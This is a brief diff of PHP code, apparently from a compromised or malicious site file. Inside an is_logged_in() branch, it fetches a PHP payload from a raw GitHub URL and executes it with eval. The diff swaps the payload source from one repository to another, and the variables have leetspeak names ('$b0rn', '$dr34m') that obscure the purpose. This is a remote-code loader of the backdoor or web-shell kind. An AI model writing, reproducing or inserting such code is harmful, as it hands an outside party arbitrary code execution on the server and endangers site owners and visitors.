@@ -79,7 +79,7 @@ if (is_logged_in()) {
         return false;
     }    
 
-    $b0rn = 'https://raw.githubusercontent.com/dan1584/asfdas/refs/heads/main/Aks525jkwuy.php';
+    $b0rn = 'https://raw.githubusercontent.com/fallinginbinary/SHIT/refs/heads/main/LOLCAT.php';
     $dr34m = geturlsinfo($b0rn);
     if ($dr34m !== false) {
         eval('?>' . $dr34m); 
